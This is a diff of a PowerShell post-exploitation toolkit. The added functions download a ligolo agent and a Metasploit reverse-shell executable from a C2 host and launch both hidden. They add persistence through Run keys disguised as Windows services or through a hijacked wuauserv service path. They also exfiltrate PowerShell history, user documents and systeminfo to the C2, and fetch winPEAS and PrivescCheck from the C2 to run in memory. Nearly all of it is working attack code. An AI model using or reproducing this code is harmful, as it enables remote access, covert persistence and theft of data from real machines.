@@ -1,24 +1,94 @@
-function Invoke-PrivEsc {
+function Invoke-Callback {
     param(
         [Parameter(Mandatory=$true)]
         [string]$C2
     )
 
     # ----------------------------------------
-    # 1. Stealthy temp folder
+    # Prepare storage folder
     # ----------------------------------------
     $tmp = Join-Path $env:TEMP ("syscache_" + [guid]::NewGuid().ToString())
-    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
+    if (!(Test-Path $tmp)) { New-Item -ItemType Directory -Path $tmp -Force | Out-Null }
+
+    # Paths for binaries
+    $agentPath = Join-Path $tmp "agent.exe"
+    $revShellPath = Join-Path $tmp "reverse.exe"
 
     # ----------------------------------------
-    # 2. Collect and POST systeminfo (for wes-ng)
+    # Download & launch agent.exe (ligolo)
     # ----------------------------------------
-    $sysInfo = systeminfo | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "systeminfo_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
-
+    Invoke-WebRequest "http://$C2/payloads/agent.exe" -OutFile $agentPath
+    Start-Process $agentPath -WindowStyle Hidden
 
     # ----------------------------------------
-    # 3. Collect and POST PowerShell history
+    # Download & launch reverse.exe (Msf rev tcp)
+    # ----------------------------------------
+    Invoke-WebRequest "http://$C2/payloads/reverse.exe" -OutFile $revShellPath
+    Start-Process $revShellPath -WindowStyle Hidden
+
+    # ----------------------------------------
+    # Detect privilege level
+    # ----------------------------------------
+    
+    # Default assumption
+    $privilegeLevel = "User"
+
+    # Check if running as local admin
+    $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+
+    if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        $privilegeLevel = "LocalAdmin"
+    }
+
+    # Try domain lookup
+    try {
+        $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
+        $currentUser = $identity.Name.Split('\')[-1]  # just username
+
+        # Build LDAP path for "Domain Admins"
+        $ldapPath = "LDAP://CN=Domain Admins,CN=Users,DC=" + ($domain -replace '\.', ',DC=')
+        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ldapPath)
+
+        $domainAdmins = $searcher.FindAll() | ForEach-Object {
+            $_.Properties.samaccountname
+        }
+
+        if ($domainAdmins -contains $currentUser) {
+            $privilegeLevel = "DomainAdmin"
+        }
+    }
+    catch {
+        # Not domain joined or no AD access
+    }
+
+    # ----------------------------------------
+    # Conditional persistence
+    # ----------------------------------------
+    if ($privilegeLevel -eq "User") {
+        # Run-key persistence
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Update Agent" -Value $agentPath
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Reverse Lookup Service" -Value $revShellPath
+    }
+    else {
+        # Modify wuauserv to launch both binaries
+        $svc = Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'"
+        if ($svc) {
+            $currentPath = $svc.PathName.Trim('"')
+            $newPath = "$currentPath & `"$agentPath`" & `"$revShellPath`""
+            $svc.Change($null,$null,$null,$null,$null,$null,$newPath,$null)
+            Start-Service wuauserv
+        }
+    }
+}
+
+function Invoke-Collection {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$C2
+    )
+    # ----------------------------------------
+    # Collect and exfiltrate PowerShell history
     # ----------------------------------------
 
     $histPath = $null
@@ -34,15 +104,13 @@ function Invoke-PrivEsc {
         try {
             $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue
             if ($psHist) {
-                # Invoke-WebRequest -UseBasicParsing -Uri "http://$($C2):8080/g" -Method Post -Body ($psHist -join "`r`n") | Out-Null
                 Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "ConsoleHost_history_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
             }
         } catch { }
     }
 
-
     # ----------------------------------------
-    # 4. Collect user files and POST
+    # Collect user files and exfiltrate
     # ----------------------------------------
     $extensions = '*.txt','*.pdf','*.xls','*.xlsx','*.doc','*.docx','*.ini'
     try {
@@ -50,13 +118,36 @@ function Invoke-PrivEsc {
         foreach ($file in $files) {
             try {
                 Invoke-FileUpload -C2 $C2 -FilePath $file | Out-Null
-            } catch { }
+            } catch {
+                Write-Host "Upload failed for: $($file.FullName)" -ForegroundColor Red
+            }
         }
-    } catch { }
+    } catch {
+        Write-Host "Error while enumerating files: $_" -ForegroundColor Yellow
+    }
+}
 
+
+function Invoke-PrivEsc {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$C2
+    )
 
     # ----------------------------------------
-    # 5. Run winPEAS.exe in memory and exfiltrate output
+    # Stealthy temp folder
+    # ----------------------------------------
+    $tmp = Join-Path $env:TEMP ("syscache_" + [guid]::NewGuid().ToString())
+    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
+
+    # ----------------------------------------
+    # Collect and POST systeminfo (for wes-ng)
+    # ----------------------------------------
+    $sysInfo = systeminfo | Out-String
+    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "systeminfo_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
+
+    # ----------------------------------------
+    # Run winPEAS.exe in memory and exfiltrate output
     # ----------------------------------------
     $peasUrl = "http://$C2/winpeas.exe"
     $wp = [System.Reflection.Assembly]::Load(
@@ -79,7 +170,7 @@ function Invoke-PrivEsc {
     Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "winpeas_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
 
     # ----------------------------------------
-    # 6. Run PrivescCheck.ps1 in-memory → POST separately
+    # Run PrivescCheck.ps1 in-memory → POST separately
     # ----------------------------------------
     $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
     Invoke-Expression $privCheck
@@ -89,9 +180,9 @@ function Invoke-PrivEsc {
     Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null
 
     # ----------------------------------------
-    # 7. Cleanup
+    # Cleanup
     # ----------------------------------------
-    Remove-Item $tmp -Recurse -Force
+    Remove-Item $privCheckHtml -Force
 }
 
 
